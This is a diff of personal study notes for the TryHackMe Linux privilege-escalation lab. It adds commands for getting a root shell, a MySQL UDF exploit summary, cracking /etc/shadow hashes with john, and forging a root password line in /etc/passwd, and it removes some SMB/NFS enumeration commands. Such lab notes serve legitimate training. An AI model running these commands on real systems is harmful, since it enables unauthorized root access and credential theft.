@@ -1,3 +1,10 @@
+###
+```
+sudo su - 
+su - 
+bash -p
+```
+
 ### 
 https://tryhackme.com/room/linuxprivesc
 
@@ -155,8 +162,28 @@ Back on the Debian VM, as the low privileged user account, execute the file to g
 /tmp/shell.elf
 ```
 
+```
+MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)
+The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.
 
-SMB:
-https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
-echo exit | smbclient -L \\\\[ip]
-nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.132.104
+ls -l /etc/shadow
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+ls -l /etc/shadow
+mkpasswd -m sha-512 newpasswordhere
+
+ls -l /etc/passwd
+openssl passwd newpasswordhere
+root:Z.5x9gGZx7J7U:0:0:root:/root:/bin/bash
+
+
+
+
+
+
+
+
+ 
+```
+
+
